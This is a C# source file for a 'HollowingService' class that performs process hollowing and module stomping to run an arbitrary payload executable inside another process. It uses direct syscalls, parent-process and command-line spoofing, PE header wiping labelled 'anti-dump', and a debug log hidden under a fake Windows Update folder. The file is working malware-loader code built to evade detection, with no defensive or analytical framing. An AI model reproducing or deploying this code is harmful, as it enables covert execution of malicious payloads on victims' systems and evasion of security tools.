using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Collections.Generic;

using System.Security.Principal;
using System.Text;

namespace VanguardCore
{
    public static unsafe class HollowingService
    {
        private static void Log(string m) {
            if (!Constants.DEBUG_MODE) return;
            try { System.IO.File.AppendAllText(System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_debug.log"), $"[{DateTime.Now}] [PRO] {m}\n"); } catch { }
        }

        public static bool RunPE(string targetPath, byte[] payload) => RunPEWithOutput(targetPath, payload, null, out _, out _);

        public static bool RunPEWithOutput(string targetPath, byte[] payload, string cmdLine, out Microsoft.Win32.SafeHandles.SafeFileHandle stdoutRead, out IntPtr hProcess)
        {
            stdoutRead = null;
            hProcess = IntPtr.Zero;
            SyscallManager.Initialize();
            var ntAlloc = SyscallManager.GetSyscallDelegate<NtAllocateVirtualMemory>("NtAllocateVirtualMemory");
            var ntWrite = SyscallManager.GetSyscallDelegate<NtWriteVirtualMemory>("NtWriteVirtualMemory");
            var ntRead = SyscallManager.GetSyscallDelegate<NtReadVirtualMemory>("NtReadVirtualMemory");
            var ntUnmap = SyscallManager.GetSyscallDelegate<NtUnmapViewOfSection>("NtUnmapViewOfSection");
            var ntQuery = SyscallManager.GetSyscallDelegate<NtQueryInformationProcess>("NtQueryInformationProcess");
            var ntThread = SyscallManager.GetSyscallDelegate<NtCreateThreadEx>("NtCreateThreadEx");
            var ntFree = SyscallManager.GetSyscallDelegate<NtFreeVirtualMemory>("NtFreeVirtualMemory");
            var ntTerminate = SyscallManager.GetSyscallDelegate<NtTerminateProcess>("NtTerminateProcess");
            var ntProtect = SyscallManager.GetSyscallDelegate<NtProtectVirtualMemory>("NtProtectVirtualMemory");

            if (ntAlloc == null || ntWrite == null || ntUnmap == null || ntQuery == null) return false;

            int lfanew = BitConverter.ToInt32(payload, 0x3C);
            if (BitConverter.ToInt16(payload, lfanew + 4) != 0x8664) return false;

            short sections = BitConverter.ToInt16(payload, lfanew + 6);
            int entryPointRVA = BitConverter.ToInt32(payload, lfanew + 0x28);
            long imageBase = BitConverter.ToInt64(payload, lfanew + 0x30);
            int sizeOfImage = BitConverter.ToInt32(payload, lfanew + 0x50);
            int sizeOfHeaders = BitConverter.ToInt32(payload, lfanew + 0x54);

            // [PRO STEALTH] Setup Output Redirection
            SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES { nLength = Marshal.SizeOf<SECURITY_ATTRIBUTES>(), bInheritHandle = true };
            IntPtr hRead, hWrite;
            if (!CreatePipe(out hRead, out hWrite, ref sa, 0)) return false;
            SetHandleInformation(hRead, 0x00000001, 0); // HANDLE_FLAG_INHERIT = 0

            CloseHandle(hWrite); // We don't need write end in parent
            stdoutRead = new Microsoft.Win32.SafeHandles.SafeFileHandle(hRead, true);
            
            // [PRO] Determine best parent process for stealth
            string parentName = "explorer";
            try { if (WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid)) parentName = "winlogon"; } catch { }

            ProcessStealth.PROCESS_INFORMATION procInfo = new ProcessStealth.PROCESS_INFORMATION();
            if (!ProcessStealth.CreateProcessWithSpoofedPPID(targetPath, cmdLine, parentName, out procInfo))
            {
                CloseHandle(hRead);
                return false;
            }

            hProcess = procInfo.hProcess;

            // [PRO] Apply Command Line Spoofing
            ProcessStealth.SpoofCommandLine(procInfo.hProcess, cmdLine);

                IntPtr remoteBase = IntPtr.Zero;
                try
                {
                    SyscallManager.PROCESS_BASIC_INFORMATION pbi = new SyscallManager.PROCESS_BASIC_INFORMATION();
                    uint rl; ntQuery(procInfo.hProcess, 0, ref pbi, (uint)Marshal.SizeOf(pbi), out rl);

                    byte[] pebBuf = new byte[8]; IntPtr br;
                    ntRead(procInfo.hProcess, (IntPtr)((long)pbi.PebBaseAddress + 0x10), pebBuf, 8, out br);
                    ntUnmap(procInfo.hProcess, (IntPtr)BitConverter.ToInt64(pebBuf, 0));

                    // [PRO] Module Stomping implementation
                    remoteBase = FindStompModule(procInfo.hProcess, (uint)sizeOfImage);
                    if (remoteBase == IntPtr.Zero)
                    {
                        // Fallback to stealthy allocation if no suitable module found
                        remoteBase = (IntPtr)imageBase;
                        UIntPtr szAlloc = (UIntPtr)sizeOfImage;
                        if (ntAlloc(procInfo.hProcess, ref remoteBase, IntPtr.Zero, ref szAlloc, 0x3000, 0x04) != 0) {
                            remoteBase = IntPtr.Zero;
                            if (ntAlloc(procInfo.hProcess, ref remoteBase, IntPtr.Zero, ref szAlloc, 0x3000, 0x04) != 0) throw new Exception("Alloc fail");
                        }
                    }
                    else
                    {
                        Log($"[PRO] Stomping into module at 0x{remoteBase.ToInt64():X}");
                        // Change protection of the stomped region to RW for writing
                        uint old; uint sStomp = (uint)sizeOfImage; IntPtr aStomp = remoteBase;
                        ntProtect(procInfo.hProcess, ref aStomp, ref sStomp, 0x04, out old); // PAGE_READWRITE
                    }

                FixImports(payload, lfanew);
                long delta = (long)remoteBase - imageBase;
                if (delta != 0) ApplyRelocations(payload, lfanew, delta);

                IntPtr wr; ntWrite(procInfo.hProcess, remoteBase, payload, (uint)sizeOfHeaders, out wr);
                int shOff = lfanew + 0x18 + BitConverter.ToInt16(payload, lfanew + 0x14);
                
                // Track sections for granular protection
                var sectionsToProtect = new List<(IntPtr addr, uint size, uint prot)>();
                
                for (int i = 0; i < sections; i++) {
                    int o = shOff + (i * 40);
                    int rva = BitConverter.ToInt32(payload, o + 12);
                    int ssz = BitConverter.ToInt32(payload, o + 16);
                    int raw = BitConverter.ToInt32(payload, o + 20);
                    uint characteristics = BitConverter.ToUInt32(payload, o + 36);

                    if (ssz > 0) {
                        byte[] sd = new byte[ssz];
                        Buffer.BlockCopy(payload, raw, sd, 0, ssz);
                        ntWrite(procInfo.hProcess, (IntPtr)((long)remoteBase + rva), sd, (uint)ssz, out wr);
                        
                        // Select granular protection
                        uint sectProt = 0x02; // PAGE_READONLY
                        if ((characteristics & 0x20000000) != 0) sectProt = 0x20; // EXECUTE -> PAGE_EXECUTE_READ
                        if ((characteristics & 0x80000000) != 0) sectProt = 0x04; // WRITE -> PAGE_READWRITE
                        
                        sectionsToProtect.Add(((IntPtr)((long)remoteBase + rva), (uint)ssz, sectProt));
                    }
                }

                // [PRO] Apply Section Protections (RW -> RX/R)
                foreach (var sec in sectionsToProtect) {
                    uint old; uint s = sec.size; IntPtr a = sec.addr;
                    ntProtect(procInfo.hProcess, ref a, ref s, sec.prot, out old);
                }

                // [PRO] Header Protection & Eraser (Anti-Dump)
                uint hProtOld; uint hSize = (uint)sizeOfHeaders; IntPtr rB = remoteBase;
                ntProtect(procInfo.hProcess, ref rB, ref hSize, 0x01, out hProtOld); // PAGE_NOACCESS
                
                // Wipe headers in remote memory
                byte[] zeroHeader = new byte[sizeOfHeaders];
                ntWrite(procInfo.hProcess, remoteBase, zeroHeader, (uint)sizeOfHeaders, out wr);

                ntWrite(procInfo.hProcess, (IntPtr)((long)pbi.PebBaseAddress + 0x10), BitConverter.GetBytes((long)remoteBase), 8, out wr);

                IntPtr ht;
                if (ntThread(out ht, 0x1FFFFF, IntPtr.Zero, procInfo.hProcess, (IntPtr)((long)remoteBase + entryPointRVA), IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero) == 0) {
                    CloseHandle(ht);
                    return true;
                }
                throw new Exception("Thread fail");
            }
            catch (Exception ex) {
                Log($"Fault: {ex.Message}");
                if (remoteBase != IntPtr.Zero) { UIntPtr z = UIntPtr.Zero; ntFree(procInfo.hProcess, ref remoteBase, ref z, 0x8000); }
                ntTerminate(procInfo.hProcess, 1);
                return false;
            }
            finally {
                SyscallManager.Cleanup();
                if (procInfo.hProcess != IntPtr.Zero) CloseHandle(procInfo.hProcess); 
                if (procInfo.hThread != IntPtr.Zero) CloseHandle(procInfo.hThread);
            }
        }

        private static void FixImports(byte[] payload, int lfanew) {
            int iRva = BitConverter.ToInt32(payload, lfanew + 0x18 + 0x78);
            if (iRva == 0) return;
            int fOff = RvaToOffset(payload, lfanew, iRva);
            if (fOff == 0) return;
            while (true) {
                int nRva = BitConverter.ToInt32(payload, fOff + 12);
                if (nRva == 0) break;
                string dN = ReadString(payload, RvaToOffset(payload, lfanew, nRva));
                IntPtr hM = SyscallManager.StealthGetModuleBase(dN);
                if (hM != IntPtr.Zero) {
                    int tOff = RvaToOffset(payload, lfanew, BitConverter.ToInt32(payload, fOff + 16));
                    int oOff = RvaToOffset(payload, lfanew, BitConverter.ToInt32(payload, fOff));
                    int idx = 0;
                    while (true) {
                        long fRva = BitConverter.ToInt64(payload, oOff + (idx * 8));
                        if (fRva == 0) break;
                        IntPtr fA = IntPtr.Zero;
                        if ((fRva & (1L << 63)) != 0) fA = SyscallManager.GetProcAddress(hM, (IntPtr)(fRva & 0xFFFF));
                        else fA = SyscallManager.GetProcAddress(hM, ReadString(payload, RvaToOffset(payload, lfanew, (int)(fRva & 0xFFFFFFFF) + 2)));
                        if (fA != IntPtr.Zero) Buffer.BlockCopy(BitConverter.GetBytes((long)fA), 0, payload, tOff + (idx * 8), 8);
                        idx++;
                    }
                }
                fOff += 20;
            }
        }

        private static void ApplyRelocations(byte[] payload, int lfanew, long delta) {
            int rRva = BitConverter.ToInt32(payload, lfanew + 0x18 + 0x70);
            int rSz = BitConverter.ToInt32(payload, lfanew + 0x18 + 0x74);
            if (rRva == 0 || rSz == 0) return;
            int fOff = RvaToOffset(payload, lfanew, rRva);
            if (fOff == 0) return;
            int cur = 0;
            while (cur < rSz) {
                int bSz = BitConverter.ToInt32(payload, fOff + cur + 4);
                if (bSz == 0) break;
                int pRva = BitConverter.ToInt32(payload, fOff + cur);
                int ent = (bSz - 8) / 2;
                for (int i = 0; i < ent; i++) {
                    ushort e = BitConverter.ToUInt16(payload, fOff + cur + 8 + (i * 2));
                    if ((e >> 12) == 10) {
                        int pO = RvaToOffset(payload, lfanew, pRva + (e & 0xFFF));
                        if (pO != 0) Buffer.BlockCopy(BitConverter.GetBytes(BitConverter.ToInt64(payload, pO) + delta), 0, payload, pO, 8);
                    }
                }
                cur += bSz;
            }
        }

        private static int RvaToOffset(byte[] payload, int lfanew, int rva) {
            short sections = BitConverter.ToInt16(payload, lfanew + 6);
            int hOff = lfanew + 0x18 + BitConverter.ToInt16(payload, lfanew + 0x14);
            for (int i = 0; i < sections; i++) {
                int vRva = BitConverter.ToInt32(payload, hOff + (i * 40) + 12);
                int vSz = BitConverter.ToInt32(payload, hOff + (i * 40) + 8);
                if (rva >= vRva && rva < vRva + vSz) return BitConverter.ToInt32(payload, hOff + (i * 40) + 20) + (rva - vRva);
            }
            return 0;
        }

        private static string ReadString(byte[] payload, int offset) {
            List<byte> bytes = new List<byte>();
            while (payload[offset] != 0 && offset < payload.Length) bytes.Add(payload[offset++]);
            return System.Text.Encoding.ASCII.GetString(bytes.ToArray());
        }

        private static IntPtr FindStompModule(IntPtr hProcess, uint minSize)
        {
            try
            {
                // We prefer modules that are common but not critical for initial stability
                // shcore.dll, uxtheme.dll, user32.dll (if large enough)
                string[] candidates = { "shcore.dll", "uxtheme.dll", "ole32.dll", "shell32.dll" };
                
                foreach (string dll in candidates)
                {
                    IntPtr hMod = SyscallManager.GetModuleHandle(dll);
                    if (hMod == IntPtr.Zero) continue;

                    // For Simplicity in NativeAOT, we assume the module is loaded at the same address in target
                    // This is true for system DLLs due to ASLR being system-wide per boot
                    
                    // Verify size
                    int lfanew = Marshal.ReadInt32(hMod, 0x3C);
                    int sizeOfImage = Marshal.ReadInt32(hMod, lfanew + 0x50);
                    
                    if (sizeOfImage >= minSize) return hMod;
                }
            }
            catch { }
            return IntPtr.Zero;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES { public int nLength; public IntPtr lpSecurityDescriptor; public bool bInheritHandle; }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)] private static extern bool CreateProcess(string n, string c, IntPtr pa, IntPtr ta, bool ih, uint f, IntPtr e, string cd, [In] ref ProcessStealth.STARTUPINFO si, out ProcessStealth.PROCESS_INFORMATION pi);
        [DllImport("kernel32.dll", SetLastError = true)] private static extern bool CloseHandle(IntPtr h);
        [DllImport("kernel32.dll", SetLastError = true)] private static extern uint WaitForSingleObject(IntPtr h, uint ms);
        [DllImport("kernel32.dll", SetLastError = true)] private static extern bool GetExitCodeThread(IntPtr h, out uint code);
        [DllImport("kernel32.dll", SetLastError = true)] private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);
        [DllImport("kernel32.dll", SetLastError = true)] private static extern bool SetHandleInformation(IntPtr hObject, uint dwMask, uint dwFlags);
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)] private static extern IntPtr LoadLibraryW(string lpLibFileName);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref uint ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtCreateSection(
            out IntPtr SectionHandle,
            uint DesiredAccess,
            IntPtr ObjectAttributes,
            ref long MaximumSize,
            uint SectionPageProtection,
            uint AllocationAttributes,
            IntPtr FileHandle);
    }
}
